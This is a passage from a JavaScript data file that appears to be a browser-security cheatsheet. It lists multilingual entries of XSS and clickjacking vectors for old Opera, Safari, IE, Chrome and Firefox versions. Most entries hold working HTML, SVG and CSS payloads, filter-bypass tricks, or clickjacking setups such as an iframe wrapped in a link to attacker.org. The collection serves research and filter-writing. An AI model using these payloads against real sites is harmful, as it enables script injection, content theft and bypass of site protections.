            'cs' : 'Opera umožňuje zobrazení komprimovaných SVG obrázků bez uvedení obvykle nutných kódovacích hlaviček. Funguje pro libovolná data v oblasti, pro kterou platí content type image/svg+xml. Všimněte si, že komprimovaná data mouhou být zkrácena. Opera je bude stále akceptovat a vyrenderuje <srcipt> čímž spustí alert(1). Většina ostatních parserů ztroskotá. Zkrácení však může být značné. Například gzip 1.3.12 vkládá asi 50+ MB binárního balastu. Uvedený příklad neobsahuje žádný skutečný SVG kód, pouze tag <SCRIPT> s atributem XHTML udavajícím jmenný prostor.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/2002/CR-SVG11-20020430/minimize.html'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera' : ['10.x', '11.0', '12.0', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'svg', 'svgz', 'gzip', 'xml', 'compression'],
        'reporter'   : '.mario'
    },
    { /* ID 106 - Safari attribute ofuscation with slashes and quotes */
        'id'         : 106,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Safari attribute ofuscation with slashes and quotes',
            'ja' : '',
            'ru' : 'Обфускация атрибута в Safari с использованием слешей и кавычек',
            'cs' : 'Safary a zamlžené atributy pomocí lomítek a uvozovacích znaků',
            'de' : ''
        },
        'data'       : '<img src onerror /" \'"= alt=%js_alert%//">',
        'description': {
            'en' : 'Safari accepts slashes and quotes (if preceded by whitespace, slashes or other quotes) between attribute names and the equals character (name/"\'=value). This enables interesting possibilities to obfuscate HTML strings, bypass filters and mimick attributes like in the given example.',
            'ja' : '',
            'ru' : 'Safari игнорирует слеши и кавычки (если им предшествует пробельный символ, слеш или другая кавычка) между именем атрибута и знаком равенства. Это открывает интересные возможности обфусцировать HTML, обойти фильтр, внешне замаскировав атрибут, как в приведенном примере.',
            'cs' : 'Safari akceptuje lomítka a uvozovací znaky (pokud jsou předcházeny bílými znaky nebo jinými uvozujícími znaky) mezi názvem atributu a rovnítkem (name/"\'=value). To přidává zajímavé možnosti, kterými lze zkreslit řetězce HTML, zmást bezpečnostní filtry a předstírat atributy jako v uvedeném příkladu.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'safari' : ['4.0', '4.0.3', 'end']
        },
        'tags'       : ['xss', 'javascript', 'safari', 'attributes', 'delimiter', 'parser'],
        'reporter'   : 'Superhei, .mario'
    },
    { /* ID 107 - JavaScript execution via title tag on Inernet Explorer 9 */
        'id'         : 107,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via <TITLE> tag on Inernet Explorer 9',
            'ja' : '',
            'ru' : 'Вызов события в теге <TITLE> в Internet Explorer 9',
            'cs' : 'Spuštění JavaScriptu skrz tag <TITLE> v Internet Exploreru 9',
            'de' : ''
        },
        'data'       : '<title onpropertychange=%js_alert%></title><title title=></title>',
        'description': {
            'en' : 'Internet Explorer 9 allows execution of JavaScript via onpropertychange event handler on <title> tags if another <title> tag follows up - having at least one valid attribute.\r\nThis vector works in IE6-8 Standards mode and in IE9 quirks mode.',
            'ja' : '',
            'ru' : 'Internet Explorer 9 позволяет вызвать событие изменения свойства (обработчик onpropertychange) в теге <TITLE>, если другой тег <TITLE>, следующий далее, имеет по меньшей мере один действительный атрибут.\r\nЭтот вектор работает в режиме стандартов IE6-8 и режиме совместимости (quirks mode) в IE9.',
            'cs' : 'Internet Explorer 9 umožňuje spustit kód JavaScriptu skrz obsluhu události onpropertychange v tagu <TITLE>, pokud je následován jiným tagem <TITLE> s alespoň jedním platným atributem.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer' : ['6.0', '7.0', '8.0', '9.0', '10.0']
        },
        'tags'       : ['xss', 'javascript', 'title', 'onpropertychange', 'internet explorer'],
        'reporter'   : '.mario'
    },
    { /* ID 108 - Internet Explorer parameter parsing issue */
        'id'         : 108,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Internet Explorer parameter parsing issue',
            'ja' : '',
            'ru' : 'Парсинг параметров в Internet Explorer',
            'cs' : 'Problémy s parsováním parametrů v Internet Exploreru',
            'de' : ''
        },
        'data'       : '<!-- IE 5-8 standards mode -->\r\n<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=%js_alert%></a>">\r\n\r\n<!-- IE 5-9 standards mode -->\r\n<!a foo=x=`y><img alt="`><img src=xx:x onerror=%js_alert_2%//">\r\n<?a foo=x=`y><img alt="`><img src=xx:x onerror=%js_alert_3%//">',
        'description': {
            'en' : 'Internet Explorer treats the sequence of any quotes that follows the equal sign in a parameter without delimiters as the beginning of some semblance of new parameter.',
            'ja' : '',
            'ru' : 'Internet Explorer рассматривает последовательность из любой кавычки, следующей за знаком равенства, внутри параметра без явно указанных ограничителей как начало некого подобия нового параметра.',
            'cs' : 'Internet Explorer zpracovává sekvence uvozujících znaků v parametru bez oddělovačů následujících za rovnítkem jako začátek nového parametru.',
            'de' : ''
        },
        'urls'    : ['#62', '#102'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer' : ['6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'parameter', 'parsing', 'internet explorer'],
        'reporter'   : 'Algol, jackmasa, sirdarckcat'
    },
    { /* ID 109 - Passive SVG JavaScript execution via style injection (1) */
        'id'         : 109,
        'category'   : 'svg', 
        'name'       : {
            'en' : 'Passive SVG JavaScript execution via style injection (1) ',
            'ja' : '',
            'ru' : 'Пассивное исполнение JavaScript в SVG c помощью стилевой инъекции (1)',
            'cs' : 'Spuštění JavaScriptu injektováním stylu v SVG (1)',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<a id="x"><rect fill="white" width="1000" height="1000"/></a>\n<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>\n</svg>',
        'attachment' : {
            'required_mime' : 'image/svg+xml',
            'crossdomain'    : '1',            
            'path'          : 'http://html5sec.org/test3.svg',
            'name'          : 'test3.svg',
            'raw'           : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n\n<clipPath id="a" >\n<set xlink:href="#x" attributeName="xlink:href" begin="1s" to="%js_uri_alert%" />\n</clipPath>\n\n<pattern id="b">\n<set xlink:href="#x" attributeName="xlink:href" begin="2s" to="%js_uri_alert_2%" />\n</pattern>\n\n<filter id="c">\n<set xlink:href="#x" attributeName="xlink:href" begin="3s" to="%js_uri_alert_3%" />\n</filter>\n\n<marker id="d">\n<set xlink:href="#x" attributeName="xlink:href" begin="4s" to="%js_uri_alert%" />\n</marker>\n\n<mask id="e">\n<set xlink:href="#x" attributeName="xlink:href" begin="5s" to="%js_uri_alert_2%" />\n</mask>\n\n<linearGradient id="f">\n<set xlink:href="#x" attributeName="xlink:href" begin="6s" to="%js_uri_alert_3%" />\n</linearGradient>\n\n</svg>'
        },
        'description': {
            'en' : 'SVG supports several new CSS properties (clip-path, fill, filter, marker, marker-end, marker-mid, marker-start, mask, stroke), which can refer to external SVG-resources. These properties can also act as separate attributes. Within the external SVG can contain information to animate the current SVG-document. Example shows an animation links, but the possibilities of animation and other elements. Note that Opera does not show the user the change of links address, if the cursor does not go beyond it.',
            'ja' : '',
            'ru' : 'SVG поддерживает несколько новых CSS-свойств (clip-path, fill, filter, marker, marker-end, marker-mid, marker-start, mask, stroke), которые могут ссылаться на внешние SVG-ресурсы. Эти свойства также могут выступать в качестве самостоятельных атрибутов. Внутри внешнего SVG может содержаться информация для анимирования действующего SVG-документа. Пример демонстрирует анимацию ссылки, но возможна также и анимация других элементов. Обратите внимание, что Opera не покажет изменение адреса ссылки, если курсор не выйдет за пределы её действия.',
            'cs' : 'SVG podporuje několik nových CSS vlastností (clip-path, fill, filter, marker, marker-end, marker-mid, marker-start, mask, stroke), které mohou odkazovat na externí SVG zdroje. Tyto vlastnosti mohou vystupovat také jako samostetné atributy. V rámci externího SVG mohou obsahovat informace oživující stávající SVG dokument. Příklad ukazuje animační odkazy, ale může zahrnovat i animace a jiné prvky. Upozorňujeme, že Opera neukazuje změnu adresy odkazu, pokud nad ním nestojí kurzor.',
            'de' : ''
        },
        'urls'    : ['#129'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera' : ['10.x', '11.0', '12.0', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'svg', 'css', 'xml', 'style'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 110 - Passive SVG JavaScript execution via style injection (2) */
        'id'         : 110,
        'category'   : 'svg', 
        'name'       : {
            'en' : 'Passive SVG JavaScript execution via style injection (2)',
            'ja' : '',
            'ru' : 'Пассивное исполнение JavaScript в SVG c помощью стилевой инъекции (2)',
            'cs' : 'Spuštění JavaScriptu injektováním stylu v SVG (2)',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\r\n<path d="M0,0" style="marker-start:url(test4.svg#a)"/>\r\n</svg>',
        'attachment' : {
            'required_mime' : 'image/svg+xml',
            'crossdomain'    : '1',            
            'path'          : 'http://html5sec.org/test4.svg',
            'name'          : 'test4.svg',
            'raw'           : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<marker id="a"  markerWidth="1000" markerHeight="1000" refX="0" refY="0">\n<a xlink:href="http://google.com">\n<set attributeName="xlink:href" to="%js_uri_alert%" begin="1s" />\n<rect width="1000" height="1000" fill="white"/>\n</a>\n</marker>\n</svg>'
        },
        'description': {
            'en' : 'This example shows how SVG markers allow insertion of external links with JavaScript URI into the current document.',
            'ja' : '',
            'ru' : 'Показано, как свойство marker позволяет вставлять в текущий документ внешнюю ссылку с псевдоскриптом в качестве URL.',
            'cs' : 'Tento příklad ukazuje, jak mohou SVG markery umožnit vkládání externích odkazů s javascript: URI do aktuálního dokumentu.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera' : ['10.x', '11.0', '11.52', 'end', 'mobile 10.0', 'mobile 11.0', 'end']
        },
        'tags'       : ['xss', 'javascript', 'svg', 'css', 'xml', 'style'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 111 - Breaking the functional notation on Chrome and Safari (2) */
        'id'         : 111,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Breaking the functional notation on Chrome and Safari (2)',
            'ja' : '',
            'ru' : 'Способ разорвать функциональную нотацию в Chrome и Safari (2)',
            'cs' : 'Přerušení funkčního zápisu v Chrome a Safari (2)',
            'de' : ''
        },
        'data'       : '<div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>',  
        'trigger': 'fuzz(document.getElementsByTagName("div")[0], "style", ["[a]"], function(e, v){if(e.style.color=="red"){pass(v)}else{fail(v)});',
        'description': {
            'en' : 'To break the functional notation "url()" can be used in combination with the following characters*: [a] 1-8,10-31,127,9,32,40\r\nNote that simultaneous breaking of functional notation and strings can be accomplished by the characters listed in #45.\r\n* Characters are given as decimal ASCII table index.',
            'ja' : '',
            'ru' : 'В качестве прерывателя функциональной нотации "url()" может быть использованы следующие символы*: [a] 1-8,10-31,127,9,32,40\n\nОбратите внимание, что для одновременного прерывания функциональной нотации и строки вы можете использовать символы, перечисленные в #45.\n\n* В десятичных кодах.',
            'cs' : 'K přerušení funkčního zápisu "url()" mohou být použity tyto znaky*: [a] 1-8,10-31,127,9,32,40\r\nUpozorňuji, že simultánní přerušení zápisu řetězce lze provést znaky uvedenými v #45.\r\n* ASCII kódy uvedené v desítkové soustavě.',
            'de' : ''
        },
        'urls'    : ['#45', '#92', '#112', '#114'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'chrome' : ['5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari' : ['4.0', '5.0', '5.1.7']
        },
        'tags'       : ['xss', 'css', 'google chrome', 'safari', 'trick', 'notation'],
        'reporter'   : 'LeverOne, .mario'
    },
    { /* ID 112 - Breaking the functional notation on IE (3) */
        'id'         : 112,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Breaking the functional notation on IE (3)',
            'ja' : '',
            'ru' : 'Способ разорвать функциональную нотацию в IE (3)',
            'cs' : 'Přerušení funkčního zápisu v IE (3)',
            'de' : ''
        },
        'data'       : '<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>',     
        'trigger'    : 'document.getElementsByTagName("div")[0].style.color=="red"?pass():fail();', 
        'description': {
            'en' : 'If any* part of the CSS-declaration (property or value) contains a left curly brace ({ - not as part of a string), the CSS declaration cannot be closed without using a matching right curly brace (}). In most browsers this feature can not be used to bypass filters - as they require to close the strings, functions and attributes inside blocks. IE nevertheless does not require to close function inside such blocks. It is important to take into account especially when filtered styles are inside the targeted tag\'s attribute. The example works up to IE 7 standards mode.\n\n*There\'s another exception for IE (see the letters [a] and [b] of #60).',
            'ja' : '',
            'ru' : 'Если какая-либо* часть CSS-декларации содержит левую фигурную скобку, не являющуюся частью строки, в этом случае CSS-декларация не может быть завершена без использования правой фигурной скобки (}). В большинстве браузеров данная особенность не может быть использована для обхода фильтрации, поскольку они требуют завершения всех строк, функций и атрибутов, открытых внутри блока. Напротив, IE не требует закрывать функцию внутри такого блока. Это нужно принимать во внимание при фильтрации стилей внутри атрибута тега, где с первого взгляда СSS-блоки не могли бы встретиться в принципе. Пример работает вплоть до режима стандартов IE 7.\n\n*Это правило имеет исключение для IE (смотрите литеры [a] и [b] в #60).',
            'cs' : 'Pokud některá část* deklarace CSS (vlastnost nebo hodnota) obsahuje levou složenou závorku ({ - není součástí řetězce), není možné deklaraci uzavřít bez odpovídající prvé složené závorky (}). Ve většině prohlížečů nemůže být tato funkce použita k obcházení filtrů, protože vyžadují uzavření řetězců, funkcí a atributů uvnitř bloku. Ovšem IE nevyžaduje uzavření funkce uvnitř těchto bloků. Během filtrování je důležité brát ohled na to, zda jsou celé zápisy stylu uvedeny uvnitř atributu cílového tagu.\n\n* Pro IE existují další vyjímky (viz. body [a] a [b] oddílu #60)',
            'de' : ''
        },
        'urls'    : ['#46', '#60', '#92', '#111', '#114'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer' : ['6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'css', 'internet explorer', 'trick', 'notation'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 113 - Jump into the selector via attribute delimiters  */
        'id'         : 113,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Jump into the selector via attribute delimiters',
            'ja' : '',
            'ru' : 'Прыжок в селектор с использованием ограничителей CSS-атрибутов.',
            'cs' : 'Skok na selector skrz oddělovač atributů',
            'de' : ''
        },
        'data'       : '<div id="x">XXX</div>\n<style>\n\n#x{font-family:foo[bar;color:green;}\n\n#y];color:red;{}\n\n</style>',        
        'trigger'    : 'getComputedStyle(document.getElementsByTagName("div")[0], null).color=="red"?pass():fail();', 
        'description': {
            'en' : 'According to established practice selectors are usually filtered less thoroughly by filtering software than other parts of CSS language constructs. This example shows how to leave a CSS-block open to get hands on a selector and inject code into a possibly less thoroughly filtered area.\r\nOn IE this example works in IE 8-9 standards mode.',
            'ja' : '',
            'ru' : 'Согласно устоявшейся практике, самой слабофильтруемой областью в фильтрах, основанных на различной фильтрации различных синтаксических групп таблиц стилей, является селектор. В примере показан способ не дать закрыть CSS-блок, добраться до селектора и внедрить код в недостаточно защищенной зоне.\r\nВ IE этот пример работает в режиме стандартов IE 8-9.',
            'cs' : 'Podle zavedené praxe jsou selektory obvykle filtrovány méně důkladně filtrovacím softwarem než jiné části CSS kódu. Tento příklad ukazuje, jak je možné opustit CSS blok k uvolnění rukou a vložit kód do možná méně důkladně filtrované části.',
            'de' : ''
        },
        'urls'    : ['#27'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox' : ['2.x', '3.0', '4.0', '15.0'],
            'opera'   : ['9.x', '10.0', '11.0', '12.0', 'mobile'],
            'internet explorer' : ['8.0', '9.0']
        },
        'tags'       : ['xss', 'css', 'firefox', 'opera', 'trick', 'selector', 'attribute'],
       'reporter'   : 'LeverOne'
    },
    { /* ID 114 - Breaking the functional notation on Chrome and Safari (4) */
        'id'         : 114,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Breaking the functional notation on Chrome and Safari (4)',
            'ja' : '',
            'ru' : 'Способ разорвать функциональную нотацию в Chrome и Safari (4)',
            'cs' : 'Přerušení funkčního zápisu v Chrome a Safari (4)',
            'de' : ''
        },
        'data'       : '<x style="background:url(\'x[a];color:red;/*\')">XXX</x>',     
        'trigger': 'fuzz(document.getElementsByTagName("x")[0], "style", ["[a]"], function(e, v){if(e.style.color=="red"){pass(v)}else{fail(v)});',
        'description': {
            'en' : 'The functional notation breaker shown in #111 also works with quoted strings for several CSS properties. The following characters can be used to break the string and create a new property-value pair: [a] Safari, Chrome 16↓: 1-8,10-31 and 127\r\nChrome 17↑: 10,12,13 (decimal ASCII table index)',
            'ja' : '',
            'ru' : 'Как бы иллюстрация к сказанному в #111: разрыв строки, который в указанных браузерах влечет разрыв функции. Как следствие, использование закрывающей круглой скобки ")" необязательно. Символы, рвущие строку и функцию: [a] Safari, Chrome 16↓: 1-8, 10-31 и 127\r\nChrome 17↑: 10,12,13 (в десятичных кодах).',
            'cs' : 'Přerušení funkčního zápisu ukázané v #111 pracuje také s uvozenými řetězci několika CSS vlastností. Následující znaky mohou být použity k přerušení řetězce a vytvoření nového páru vlastnosti a hodnoty: [a] Safari, Chrome 16↓: 1-8,10-31 a 127\r\nChrome 17↑: 10,12,13 (uvedeno v desítkové soustavě)',
            'de' : ''
        },
        'urls'    : ['#45', '#92', '#111', '#112'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'chrome' : ['5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari' : ['4.0', '5.0', '5.1.7']
        },
        'tags'       : ['xss', 'css', 'google chrome', 'safari', 'trick', 'notation'],
        'reporter'   : '.mario, LeverOne'
    },
    { /* ID 115 - Internet Explorer conditional comments - XSS via [if]> and <img> injection */
        'id'         : 115,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Internet Explorer conditional comments - XSS via [if]> and <img> injection',
            'ja' : '',
            'ru' : 'Разрушение условных комментариев в Internet Explorer',
            'cs' : 'Podmíněné komentáře v Internet Exploreru - XSS injekcí [if]> a <img>',
            'de' : ''
        },
        'data'       : '<!--[if]><script>%js_alert%</script -->\r\n<!--[if<img src=x onerror=%js_alert_2%//]> -->',        
        'description': {
            'en' : 'Conditional comments on Internet Explorer can cause trouble as soon as an attacker is able to inject rectangular brackets wrapping the words if and endif with almost arbitrary suffixes. A condition always being true will lead to immediate parsing of the enclosed markup on all tested Internet Explorer versions. The second example injects an <img> tag into the comment condition leading to immediate JavaScript execution as well. The examples are worked up to IE 9 standards mode.',
            'ja' : '',
            'ru' : 'Условные комментарии могут стать проблемой, если атакующий может внедрять секции [...], содержащие условия if или endif с произвольными суффиксами. Как правило нарушение синтаксиса внутри прямоугольных скобок (условной секции) приводит к тому, что браузер начинает рассматривать такие структуры как простой текст и интерпретировать содержащуюся внутри разметку. Различные способы вызвать ошибку в условной секции показаны в этих двух примерах. Отметим, что символ закрытия тега ">" внутри условной секции повлечет парсинг такой конструкции как простого HTML-комментария, и превращения в простой текст не произойдет. Примеры работают вплоть до режима стандартов IE 9 .',
            'cs' : 'Komentáře v Internet Exploreru mohou způsobit problémy, pokud v nich může uživatel použít hranatých závorek. Tyto komentáře mohou být vyhodnoceny jako podmíněné a v případě splnění podmínky vedou ke spuštění vloženého skriptu. První uvedený příklad ve ve všech verzích IE vždy vyhodnocen pozitivně a dojde tak k okamžitému spuštění kódu. Druhý příklad ukazuje injektáž tagu <img> přímo mezi hranaté závorky a stejně jako v prvním příkladu vede k automatickému spuštění skriptu.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms537512%28v=vs.85%29.aspx', '#37', '#38'],
        'howtofix'   : {
            'en' : 'Make sure an attacker cannot turn a comment injection into a conditional comment by using rectangular brackets such as shown in the example. Comment content should be escaped like regular markup - the delimiting sequence --> is neither sufficient nor necessary to successfully close a comment.',
            'ja' : '',
            'ru' : 'Убедитесь, что атакующий не сможет внедрить внутрь комментария условную секцию с нарушенным синтаксисом, как показано в примере. Содержание комментариев, если они допускаются политикой фильтра должно быть анализированно подобно обычной разметке. Помните, что традиционный закрывающий ограничитель комментария, как показывает практика, не является единственным для успешного закрытия комментария.',
            'cs' : 'Ujistěte se, že útočník nemůže uvnitř komentáře používat hranaté závorky a tím změnit komentář na podmíněný.',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer' : ['6.0', '7.0', '8.0', '9.0', '10.0']
        },
        'tags'       : ['xss', 'conditional', 'comments', 'internet explorer', 'rectangular'],
        'reporter'   : '.mario'
    },
    { /* ID 116 - Internet Explorer applying behavior via <import namespace>  */
        'id'         : 116,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'Internet Explorer applying behavior via <import namespace>',
            'ja' : '',
            'ru' : 'Назначение поведения с помощью тега <import> в Internet Explorer',
            'cs' : 'Nastavení akcí objektů v Internet Exploreru přes <import namespace>',
            'de' : ''
        },
        'data'       : '<div id="x">x</div>\n<xml:namespace prefix="t">\n<import namespace="t" implementation="#default#time2">\n<t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=%js_alert%&gt;">',        
        'description': {
            'en' : 'Internet Explorer allows to apply namespaces and attach behaviors not only by using CSS but <import> or <?import> tags. The example shows how to work with HTML+TIME behaviors without using style attributes or tags and cause script execution via the to attribute. If there is no attribute "targetElement",  will be overridden "innerHTML" property of the <body> tag. To limit the area that be changed, you can use the attribute "targetElement".\r\nThis syntax is also supported in IE9 for non-obsolete behaviors.',
            'ja' : '',
            'ru' : 'Internet Explorer позволяет указывать пространство имен и назначать поведение для тега не только с помощью стилей, но также и с помощью тегов <import> или <?import> и <xml:namespace> или <?xml:namespace>.  Также не стоит упускать возможность указать целевой тег для анимирования в атрибуте targetElement. Если он не указан будет перезаписано соответствующее свойство у тега <BODY>. Данный синтаксис также поддерживается в IE9 для неустаревших поведений.',
            'cs' : 'Internet Explorer umožňuje použití jmenných prostorů a připojení akcí k objektům nejen pomocí CSS, ale i HTML tagy <import> nebo <?import>. Uvedený příklad ukazuje jak pracovat s HTML + TIME bez použití stylu nebo tagu a jak spustit kód prostřednictvím atributu "to". Pokud neexistuje prvek určený atributem "targetElement", bude pomocí "innerHTML" přepsán obsah prvku <body>. Atributem "targetElement" můžete tedy omezit oblast, která bude změněna.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms533793%28v=vs.85%29.aspx', '#16', '#24', '#28'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer' : ['6.0', '7.0', '8.0', 'end']
        },
        'tags'       : ['xss', 'behavior', 'import', 'xml', 'namespace', 'time', 'entities'],
        'reporter'   : 'LeverOne, GreyMagic'
    },
	{ /* ID 117 - Reverse clickjacking */
        'id'         : 117,
        'category'   : 'clickjacking', 
        'name'       : {
            'en' : 'Reverse clickjacking via <IFRAME>',
            'ja' : '',
            'ru' : 'Обратный перехват нажатий с помощью <iframe>',
            'cs' : 'Reverzní clickjacking přeš <IFRAME>',
            'de' : ''
        },
        'data'       : '<a href="http://attacker.org">\n\t<iframe src="http://example.org/"></iframe>\n</a>',        
        'description': {
            'en' : 'Internet Explorer allows to place <IFRAME> tags inside <A> tags. By clicking on a not clickable element inside the IFRAME there will be executed the URL defined in the "href" attribute of the <A> tag.',
            'ja' : '',
            'ru' : 'Internet Explorer допускает помещать тег <iframe> внутрь тега <a>. При нажатии на некликабельный элемент внутри ифрейма пользователь будет отправлен по адресу, содержащемуся в атрибуте href тега <a>.',
            'cs' : 'Internet Explorer umožňuje umístit prvek <IFRAME> do obsahu párového tagu <A>. Kliknutím na neklikatelný prvek v rámu, bude proveden přechod na URL definované v tagu <A>.',
            'de' : ''
        },
        'urls'    : ['http://iseclab.org/papers/asiaccs122-balduzzi.pdf'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer' : ['8.0', '9.0']
        },
        'tags'       : ['clickjacking', 'internet explorer', 'iframe'],
        'reporter'   : 'mniemietz'
    } 
	,
	{ /* ID 118 - Text injection by drag-and-drop */
        'id'         : 118,
        'category'   : 'clickjacking', 
        'name'       : {
            'en' : 'Text injection by drag-and-drop',
            'ja' : '',
            'ru' : 'Текстовая инъекция при перетаскивании',
            'cs' : 'Injekce textu využitím grag-and-drop',
            'de' : ''
        },
        'data'       : '<div draggable="true" ondragstart="event.dataTransfer.setData(\'text/plain\',\'malicious code\');">\n\t<h1>Drop me</h1>\n</div>\n\n<iframe src="http://www.example.org/dropHere.html"></iframe>',        
        'description': {
            'en' : 'The method "setData" allows, with the event handler "ondragstart" and the attribute "draggable" with the value "true", to drag the text "malicious code" and not "Drop me" into the IFRAME. This IFRAME can consist of a web page with an input field to drop in data.',
            'ja' : '',
            'ru' : 'В примере показано, как с помощью метода setData осуществить подмену перетаскиваемого текста, т.к. в данном случае в целевой ифрейм будет передан не текст "Drop me", а содержимое строки "malicious code". Сам ифрейм может содержать, например, некое поле ввода, критически зависимое от вводимых данных. ',
            'cs' : 'Metoda "setData" umožňuje, s využitím ovladače události "ondragstart" a při nastaveném atributu "draggable" na "true", přetáhnout během drag-end-drop do rámu text "malicious code" namísto textu "Drop me". Rám může obsahovat vstupní pole pro převzetí těchto dat.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/html5/dnd.html#dnd'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera'   : ['12.0'],
            'firefox' : ['3.x', '4.0', '15.0'],
	          'safari' : ['5.0', '5.1.7']
        },
        'tags'       : ['clickjacking', 'firefox', 'drag-and-drop', 'setData', 'ondragstart', 'draggable'],
        'reporter'   : 'mniemietz'
    }
	,
	{ /* ID 119 - Content extraction via view-source */
        'id'         : 119,
        'category'   : 'clickjacking', 
        'name'       : {
            'en' : 'Content extraction via view-source',
            'ja' : '',
            'ru' : 'Извлечение содержания через протокол view-source',
            'cs' : 'Získání zdrojového kódu protokolem view-source',
            'de' : ''
        },
        'data'       : '<iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>\n\n<textarea type="text" cols="50" rows="10"></textarea>',        
        'description': {
            'en' : 'To show the source code of a web page inside the web browser Mozilla Firefox or Google Chrome, "view-source:" can be used as a prefix for the URL. Firefox - and that is essential for this vector - allows iframes to show view-source: URLs. With the combination of a "textarea" tag, just two drags to perform this attack are needed, as in the case of elements like images. The first drag is to select an element and the second to drag an element out of the iframe into the text area. This method also bypasses CSS and JS based clickjacking protection.',
            'ja' : '',
            'ru' : 'Чтобы показать исходный код, такие браузеры, как Mozilla Firefox и Google Chrome, перед URL используют префикс view-source. Firefox указанных версий, что важно для данного вектора, разрешает показывать URL с этим префиксом в теге <iframe>. В сочетании с тегом <textarea> для осуществления атаки необходимо два движения (two drags), как и в случае с изображениями. Первое движение в выделении элемента и второе движение в перетаскивании выделенного в <textarea>. Этот метод также обходит защиту от перехвата нажатий, основанную на CSS и JS.',
            'cs' : 'Chcete-li zobrazit zdrojový kód webové stránky v prohlížeči Mozilla Firefox nebo v Google Chrome, můžete použít protokolu "view-source". Firefox umožňuje zobrazit zdrojový kód použitím "view-source" v atributu "src" u prvku <IFRAME>. Pokud pak na stjnou stránku umístíme také prvek <TEXTAREA>, můžeme po přetažení získat zdrojový kód cílové stránky. Tato technika obchází také CSS a JS ochranu proti clickajckingu.',
            'de' : ''
        },
        'urls'    : ['http://www.contextis.co.uk/resources/white-papers/clickjacking/Context-Clickjacking_white_paper.pdf'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
			'firefox': ['2.x', '3.0', '4.0', '13.0', 'end']
        },
        'tags'       : ['clickjacking', 'firefox', 'content extraction', 'view-source'],
        'reporter'   : 'mniemietz'
    }	
	,
	{ /* ID 120 - Pop-up blocker bypass */
        'id'         : 120,
        'category'   : 'clickjacking', 
        'name'       : {
            'en' : 'Pop-up blocker bypass',
            'ja' : '',
            'ru' : 'Обход блокировки всплывающих окон',
            'cs' : 'Bypass pop-up blokeru',
            'de' : ''
        },
